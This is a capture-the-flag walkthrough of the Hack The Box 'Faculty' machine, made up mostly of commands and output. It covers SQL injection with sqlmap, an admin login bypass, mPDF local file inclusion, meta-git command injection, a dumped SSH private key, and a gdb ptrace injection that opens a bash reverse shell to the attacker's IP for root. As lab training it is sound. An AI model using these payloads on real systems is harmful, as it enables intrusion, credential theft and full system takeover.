
echo "10.10.11.169 faculty.htb" >> /etc/hosts


22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)


#SQL injection in id_no!

POST /admin/ajax.php?action=login_faculty HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 61
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/login.php
Cookie: PHPSESSID=rg8eavvcph4tgmgbqs8bnlubtf

id_no=123'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)+AND+'1'='1

#bingo! parametr id_no is vulnerable,because server response is more that 2-3 seconds. and code 200 =) 


#try to find sql request for SQLi in sqlmap

#u need read this info! https://kalilinuxtutorials.com/sqlmap2/

#posle tancev s bubnom i razmimi zaprosami, poluchilas' vot takaya komanda:

sqlmap -u "http://faculty.htb/admin/ajax.php?action=login_faculty" --data "id_no=1111" -p id_no --batch --level 2 --dbms=Mysql

#Take database name:
sqlmap -u "http://faculty.htb/admin/ajax.php?action=login_faculty" --data "id_no=1111" -p id_no --batch --level 2 --dbms=Mysql --dbs

[*] `infimation_schema`
[*] scheduling_db


#take tables from db scheduling_db
sqlmap -u "http://faculty.htb/admin/ajax.php?action=login_faculty" --data "id_no=1111" -p id_no --batch --level 2 --dbms=Mysql -D scheduling_db --tables

[3 tables]
+---------------------+
| class_schedule_info |
| courses             |
| faculty             |
| users               |
+---------------------+

#wow! after dumping tables we have log and pass for auth.

sqlmap -u "http://faculty.htb/admin/ajax.php?action=login_faculty" --data "id_no=1111" -p id_no --batch --level 2 --dbms=Mysql -D scheduling_db -T users --dump

[1 entry]
+----+---------+------+----------------------------------+----------+
| id | Hame    | type | password                         | username |
+----+---------+------+----------------------------------+----------+
| 1  | <blank> | 1    | 1fecbd762af147c1176a0fc2c722a345 | admin    |
+----+---------+------+----------------------------------+----------+

#BUT this hash summ of password dont crack)))
S#O, we need dump other tables

sqlmap -u "http://faculty.htb/admin/ajax.php?action=login_faculty" --data "id_no=1111" -p id_no --batch --level 2 --dbms=Mysql -D scheduling_db -T faculty --dump

we have 3 id_no
63033226
85662050
30903070

#log in with 63033226, check burp suite.


POST /admin/ajax.php?action=get_schecdule HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 12
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/index.php
Cookie: PHPSESSID=rg8eavvcph4tgmgbqs8bnlubtf
Cache-Control: max-age=0

faculty_id=3




#we found parametr faculty_id! lets try injection.
#save this requset to file sql.req and use sqlmap!

sqlmap -r sql.req --batch
#bingo! go take db name
# again
# available databases [2]:
# [*] information_schema
# [*] scheduling_db
# we need try take access to file or read file via SQLi

#sqlmap find 3 type injection:

    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
 1   Payload: faculty_id=(SELECT (CASE WHEN (9631=9631) THEN 3 ELSE (SELECT 2110 UNION SELECT 4420) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
 2   Payload: faculty_id=3 AND (SELECT 5425 FROM (SELECT(SLEEP(5)))FzmU)

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
  3  Payload: faculty_id=3 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7071,0x71796f657643585a4d624f50486561427645464b71785561485679747a74777369576f77684d5a51,0x7170787a71)-- -
    
    
    
#go to burp and send the request with SQLi

POST /admin/ajax.php?action=get_schecdule HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 205
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/index.php
Cookie: PHPSESSID=rg8eavvcph4tgmgbqs8bnlubtf
Cache-Control: max-age=0

faculty_id=3 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a7071,0x71796f657643585a4d624f50486561427645464b71785561485679747a74777369576f77684d5a51,0x7170787a71)-- -



#vse popitki sqli ne rabotaut tut, chtobi dostat' kakuyu to infu
# probuem drugoi put'

./gobuster dir  -u faculty.htb -w /home/kali/Desktop/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -t 200 --no-error

#we found admin direcotiry -> http://faculty.htb/admin/login.php
#i tried bruteforce this admin panel, but it is not work.
#when i use login "admin' -- -" with random password - work! =) SQLi again
# by the way, ' OR 1=1#    this username works too....


#after analyze web site i found http://faculty.htb/admin/index.php?page=subjects this page, where we can upload pdf file
#when we use button PDF, redirect to http://faculty.htb/mpdf/tmp/OKkVNn7tYLhaJC0eHXdfz3lbUS.pdf


#download generation file

curl http://faculty.htb/mpdf/tmp/OKNlYrPWRGo4DOIitVf5xT7vmF.pdf --output 123.pdf

root㉿kali)-[/home/kali/Desktop]
└─# exiftool 123.pdf                                          
ExifTool Version Number         : 12.44
File Name                       : 123.pdf
Directory                       : .
File Size                       : 1779 bytes
File Modification Date/Time     : 2022:10:21 04:41:04-04:00
File Access Date/Time           : 2022:10:21 04:41:05-04:00
File Inode Change Date/Time     : 2022:10:21 04:41:04-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Page Layout                     : OneColumn
Producer                        : mPDF 6.0
Create Date                     : 2022:10:21 09:40:50+01:00
Modify Date                     : 2022:10:21 09:40:50+01:00


#we know that used mPDF 6.0
# after googling, we cat find this information
#https://github.com/mpdf/mpdf/issues/356
#https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f
#JUST DO IT.

decode the payload:
https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iL2V0Yy9wYXNzd2QiIGNvbnRlbnQ9Ii9ldGMvcGFzc3dkIiBpY29uPSJHcmFwaCIgdGl0bGU9IkF0dGFjaGVkIEZpbGU6IC9ldGMvcGFzc3dkIiBwb3MteD0iMTk1IiAvPg


When you click button pdf, check burp and change parametr pdf=. paste decode payload.


POST /admin/download.php HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 3372
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=subjects
Cookie: PHPSESSID=rg8eavvcph4tgmgbqs8bnlubtf

pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF



#when open new web page with pdf, you need use fire fox and open "Show Attachment" in the side bar and download the “passwd” attachment.

cat passwd 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin


#wow! we have info from etc/passwd
#We can look different file on the host! after googling and spend many time, i found file db_connect.php:
#P.S. check file /var/www/scheduling/admin/admin_class.php

<annotation file=" /var/www/scheduling/admin/db_connect.php" content=" /var/www/scheduling/admin/db_connect.php" icon="Graph" title="Attached File:  /var/www/scheduling/admin/db_connect.php" pos-x="195" />

https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iIC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAiIGNvbnRlbnQ9IiAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwIiBpY29uPSJHcmFwaCIgdGl0bGU9IkF0dGFjaGVkIEZpbGU6ICAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwIiBwb3MteD0iMTk1IiAvPg

JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMGNvbnRlbnQ9JTI1MjIlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwaWNvbj0lMjUyMkdyYXBoJTI1MjIlMjUyMHRpdGxlPSUyNTIyQXR0YWNoZWQlMjUyMEZpbGU6JTI1MjAlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF




#click button pdf and change in burp parametr pdf. download in "show attachment" in side bar the file db_connect.php


cat db_connect.php 
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));


#bingo!
#we have password: Co.met06aci.dly53ro.per
#after bruteforce ssh, i ca log in used log  gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash


ssh gbyolo@10.10.11.169


#BUT this user is not user.txt =)
#i used linpeas and pspy64, but cant find vulners or misconfig
#we need user developer.
#lets find sudoers:

awk -F':' '{ print $1}' /etc/passwd | grep gbyolo

#oh lya lya! =) lets try sudo/su.

gbyolo@faculty:/home$ sudo -l
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
    
#this info says that we can used /usr/local/bin/meta-git with developer priv!
#read it -> https://hackerone.com/reports/728040
#RCE in in the meta-git module (https://www.npmjs.com/package/meta-git)
#JUST DO IT


sudo -u developer /usr/local/bin/meta-git clone 'randomstring||whoami'

#its work!!!
#lets take the bash

sudo -u developer /usr/local/bin/meta-git clone 'randomstring||bash'

#wow! we have shell for developer

developer@faculty:/home$ ls
developer  gbyolo
developer@faculty:/home$ cd developer
developer@faculty:~$ cat user.txt 
5243273fa02bffae6b0fbf1cb02ea420


___________________________________________
ROOT
___________________________________________

# u nas est' developer
# go take id_rsa for developer!

sudo -u developer meta-git clone 'randomstring | cat ~/.ssh/id_rsa'


-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----


touch developer.key
vim developer.key   #ctrl+v open private ssh key    :wq
chmod 600 developer.key

ssh -i developer.key developer@10.10.11.169


#download linpeas and use it for find

developer@faculty:~$ uname -a
Linux faculty 5.4.0-121-generic #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
#ok, https://github.com/carlospolop/PEASS-ng/releases/download/20221016/linpeas.sh this script is correct. download it

#on kali
ip add | grep tun      
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    inet 10.10.16.10/23 scope global tun0


curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh --output lp.sh --silent

(root㉿kali)-[/home/kali/Desktop]
└─# ls -la | grep linpeas
-rwxrwx---  1 kali kali    827827 Oct 21 06:15 lp.sh

root㉿kali)-[/home/kali/Desktop]
└─# python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...


#on faculty machine

wget http://10.10.16.10:8081/lp.sh
chmod 777 lp.sh
./lp.sh
./lp.sh -a > /home/developer/lp.txt


#we have different possible CVE. i try to exploit - not work.
#this command says that programm /usr/bin/gdb have cap_sys_ptrace privelege

getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
#but, we have information about cap_sys_ptrace

https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
https://attackdefense.com/challengedetailsnoauth?cid=1412
https://www.exploit-db.com/exploits/41128

#nahodim process pod rootum

cat lp.txt | grep python3 | grep root
OR
ps faux | grep ^root | grep python3

#v nashem sluchae nado sdelat' reverse shell v programme /usr/bin/gdb dlya polucheniya root bash


#we need to do reverse shell command:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell

bash -i >& /dev/tcp/10.10.16.10/9191 0>&1




#export pid python3:

export PID=$(ps aux | grep "^root.*python3" | awk '{print $2}')

#start gdb programm with pid python:

gdb -p $PID

#on kali

nc -lvp 9191

#call system void with dev tcp reverse shell

call (void)system("bash -i >& /dev/tcp/10.10.16.10/9191 0>&1")     # not work!!!! after googling and see prompt, i try this:

call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.16.10/9191 0>&1'")


check nc on kali. bingo!

root@faculty://# cat root/root.txt
cat root/root.txt
8264d193b7baf20d22856c6499f195a8



good job! nice)
good luck
